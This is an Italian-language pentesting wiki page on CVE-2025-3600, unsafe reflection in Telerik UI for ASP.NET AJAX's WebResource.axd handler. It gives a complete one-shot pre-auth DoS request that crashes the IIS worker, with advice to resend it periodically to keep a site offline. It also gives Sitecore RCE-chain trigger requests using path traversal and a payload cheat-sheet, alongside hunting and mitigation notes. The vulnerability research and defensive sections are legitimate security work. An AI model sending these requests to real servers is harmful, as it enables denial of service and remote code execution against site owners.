# Telerik UI for ASP.NET AJAX – Reflection insicura tramite WebResource.axd (type=iec)

{{#include ../../banners/hacktricks-training.md}}

> L'esecuzione del costruttore pre‑auth nell'Image Editor cache handler di Telerik UI for ASP.NET AJAX consente un DoS universale e, in molte app, RCE pre‑auth tramite gadget specifici per il target (CVE-2025-3600).

## TL;DR

- Componente/route interessato: Telerik.Web.UI.WebResource.axd con query type=iec (Image Editor cache handler). Esposto pre‑auth in molti prodotti.
- Primitive: L'attaccante controlla un nome di tipo (prtype). Il handler lo risolve con Type.GetType() e invoca Activator.CreateInstance() prima di verificare la sicurezza del tipo rispetto all'interfaccia. Qualsiasi costruttore .NET pubblico senza parametri verrà eseguito.
- Impatto:
- DoS pre‑auth universale usando un gadget del .NET framework (PowerShell WSMan finalizer).
- Spesso si eleva a RCE pre‑auth in deployment reali abusando di gadget specifici dell'app, in particolare handler AppDomain.AssemblyResolve insicuri.
- Fix: Aggiornare a Telerik UI for ASP.NET AJAX 2025.1.416+ oppure rimuovere/bloccare il handler.

## Versioni interessate

- Le versioni di Telerik UI for ASP.NET AJAX dalla 2011.2.712 alla 2025.1.218 (incluse) sono vulnerabili.
- Corretto in 2025.1.416 (rilasciato 2025-04-30). Applicare la patch immediatamente o rimuovere/bloccare il handler.

## Superficie interessata e scoperta rapida

- Controlla l'esposizione:
- GET /Telerik.Web.UI.WebResource.axd dovrebbe restituire qualcosa di diverso da 404/403 se il handler è registrato.
- Ispeziona web.config per handler mappati su Telerik.Web.UI.WebResource.axd.
- Il percorso che attiva il codice vulnerabile richiede: type=iec, dkey=1, e prtype=<AssemblyQualifiedType>.

Esempio di probe e trigger generico:
```http
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=Namespace.Type, Assembly
```
Note
- Alcuni PoC usano dtype; l'implementazione verifica dkey=="1" per il flusso di download.
- prtype deve essere assembly-qualified o risolvibile nell'AppDomain corrente.

## Causa principale – unsafe reflection in ImageEditorCacheHandler

Il flusso di download della cache di Image Editor costruisce un'istanza di un tipo fornito in prtype e solo più tardi la esegue il cast a ICacheImageProvider e valida la chiave di download. Il costruttore è già stato eseguito quando la validazione fallisce.

<details>
<summary>Flusso decompilato rilevante</summary>
```csharp
// entrypoint
public void ProcessRequest(HttpContext context)
{
string text = context.Request["dkey"];           // dkey
string text2 = context.Request.Form["encryptedDownloadKey"]; // download key
...
if (this.IsDownloadedFromImageProvider(text)) // effectively dkey == "1"
{
ICacheImageProvider imageProvider = this.GetImageProvider(context); // instantiation happens here
string key = context.Request["key"];
if (text == "1" && !this.IsValidDownloadKey(text2))
{
this.CompleteAsBadRequest(context.ApplicationInstance);
return; // cast/check happens after ctor has already run
}
using (EditableImage editableImage = imageProvider.Retrieve(key))
{
this.SendImage(editableImage, context, text, fileName);
}
}
}

private ICacheImageProvider GetImageProvider(HttpContext context)
{
if (!string.IsNullOrEmpty(context.Request["prtype"]))
{
return RadImageEditor.InitCacheImageProvider(
RadImageEditor.GetICacheImageProviderType(context.Request["prtype"]) // [A]
);
}
...
}

public static Type GetICacheImageProviderType(string imageProviderTypeName)
{
return Type.GetType(string.IsNullOrEmpty(imageProviderTypeName) ?
typeof(CacheImageProvider).FullName : imageProviderTypeName); // [B]
}

protected internal static ICacheImageProvider InitCacheImageProvider(Type t)
{
// unsafe: construct before enforcing interface type-safety
return (ICacheImageProvider)Activator.CreateInstance(t); // [C]
}
```
</details>

Primitiva dell'exploit: Stringa di tipo controllata → Type.GetType la risolve → Activator.CreateInstance esegue il suo costruttore pubblico senza parametri. Anche se la richiesta viene poi rifiutata, i side‑effects del gadget si sono già verificati.

## Universal DoS gadget (non sono richiesti gadget specifici dell'app)

Class: System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper in System.Management.Automation (PowerShell) ha un finalizer che esegue Dispose su un handle non inizializzato, causando un'eccezione non gestita quando il GC lo finalizza. Questo manda in crash in modo affidabile il processo worker di IIS poco dopo l'instanziazione.

One‑shot DoS request:
```http
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper,+System.Management.Automation,+Version%3d3.0.0.0,+Culture%3dneutral,+PublicKeyToken%3d31bf3856ad364e35
```
Note
- Continua a inviare periodicamente per mantenere il sito offline. Potresti osservare il costruttore invocato in un debugger; il crash avviene durante la finalizzazione.

## From DoS to RCE – escalation patterns

L'esecuzione non sicura dei costruttori sblocca molti gadget e catene specifici per il target. Cerca:

1) Parameterless constructors that process attacker input
- Alcuni ctors (o inizializzatori statici) leggono immediatamente Request query/body/cookies/headers e (de)serializzano i dati.
- Esempio (Sitecore): una catena di ctor raggiunge GetLayoutDefinition() che legge il body HTTP "layout" e deserializza JSON via JSON.NET.

2) Constructors that touch files
- Ctros che caricano o deserializzano config/blobs dal disco possono essere forzati se riesci a scrivere in quei percorsi (cartelle uploads/temp/data).

3) Constructors performing app-specific ops
- Reimpostare lo stato, attivare/disattivare moduli o terminare processi.

4) Constructors/static ctors that register AppDomain event handlers
- Molte app aggiungono AppDomain.CurrentDomain.AssemblyResolve handlers che costruiscono percorsi DLL da args.Name senza sanitizzazione. Se puoi influenzare la risoluzione dei tipi puoi forzare il caricamento arbitrario di DLL da percorsi controllati dall'attaccante.

5) Forcing AssemblyResolve via Type.GetType
- Richiedi un tipo inesistente per forzare la risoluzione del CLR e invocare i resolver registrati (potenzialmente insicuri). Esempio assembly-qualified name:
```
This.Class.Does.Not.Exist, watchTowr
```
6) Finalizers con effetti collaterali distruttivi
- Alcuni tipi cancellano file a percorso fisso nei finalizers. Combinato con link-following o percorsi prevedibili questo può abilitare local privilege escalation in alcuni ambienti.

## Esempio di catena RCE pre‑auth (Sitecore XP)

- Passo 1 – Pre‑auth: Attiva un tipo il cui static/instance ctor registra un handler AssemblyResolve insicuro (e.g., Sitecore’s FolderControlSource in ControlFactory).
- Passo 2 – Post‑auth: Ottenere permessi di scrittura in una directory probeata dal resolver (e.g., tramite un auth bypass o un upload debole) e piantare una DLL malevola.
- Passo 3 – Pre‑auth: Usare CVE‑2025‑3600 con un tipo non esistente e un nome assembly contenente traversal per forzare il resolver a caricare la DLL piantata → code execution as the IIS worker.

Esempi di trigger
```http
# Load the insecure resolver (no auth on many setups)
GET /-/xaml/Sitecore.Shell.Xaml.WebControl

# Coerce the resolver via Telerik unsafe reflection
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=watchTowr.poc,+../../../../../../../../../watchTowr
```
## Note di validazione, hunting e DFIR

- Validazione in laboratorio sicuro: lanciare il DoS payload e osservare il riciclo dell'app pool/eccezione non gestita legata al WSMan finalizer.
- Hunt nella telemetria:
- Richieste a /Telerik.Web.UI.WebResource.axd con type=iec e valori prtype anomali.
- Tentativi di type load falliti ed eventi AppDomain.AssemblyResolve.
- Crash/ricicli improvvisi di w3wp.exe a seguito di tali richieste.

## Mitigazione

- Applicare la patch a Telerik UI for ASP.NET AJAX 2025.1.416 o successiva.
- Rimuovere o limitare l'esposizione di Telerik.Web.UI.WebResource.axd dove possibile (WAF/rewrites).
- Ignorare o rinforzare la gestione di prtype lato server (l'upgrade applica controlli appropriati prima dell'instanziazione).
- Eseguire audit e rinforzare gli handler personalizzati AppDomain.AssemblyResolve. Evitare di costruire percorsi da args.Name senza sanitizzazione; preferire strong-named loads o whitelist.
- Limitare le posizioni di upload/scrittura e impedire il drop di DLL nelle directory ispezionate.
- Monitorare i tentativi di type load verso tipi inesistenti per individuare abusi del resolver.

## Cheat‑sheet

- Verifica di presenza:
- GET /Telerik.Web.UI.WebResource.axd
- Controllare la mappatura degli handler in web.config
- Exploit skeleton:
```http
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=<TypeName,+Assembly,+Version=..., +PublicKeyToken=...>
```
- Universale DoS:
```http
...&prtype=System.Management.Automation.Remoting.WSManPluginManagedEntryInstanceWrapper,+System.Management.Automation,+Version%3d3.0.0.0,+Culture%3dneutral,+PublicKeyToken%3d31bf3856ad364e35
```
- Risolutore del trigger:
```
This.Class.Does.Not.Exist, watchTowr
```
## Tecniche correlate

- IIS post-exploitation, .NET key extraction, e in‑memory loaders:

{{#ref}}
iis-internet-information-services.md
{{#endref}}

- ASP.NET ViewState deserialization e machineKey abuses:

{{#ref}}
../../pentesting-web/deserialization/exploiting-__viewstate-parameter.md
{{#endref}}

## Riferimenti

- [watchTowr labs – More than DoS: Progress Telerik UI for ASP.NET AJAX Unsafe Reflection (CVE-2025-3600)](https://labs.watchtowr.com/more-than-dos-progress-telerik-ui-for-asp-net-ajax-unsafe-reflection-cve-2025-3600/)
- [Black Hat USA 2019 – SSO Wars: The Token Menace (Mirosh & Muñoz) – DoS gadget background](https://i.blackhat.com/USA-19/Wednesday/us-19-Munoz-SSO-Wars-The-Token-Menace-wp.pdf)
- [ZDI – Abusing arbitrary file deletes to escalate privilege](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [watchTowr – Is “B” for Backdoor? (Sitecore chain CVE-2025-34509)](https://labs.watchtowr.com/is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform/)

{{#include ../../banners/hacktricks-training.md}}
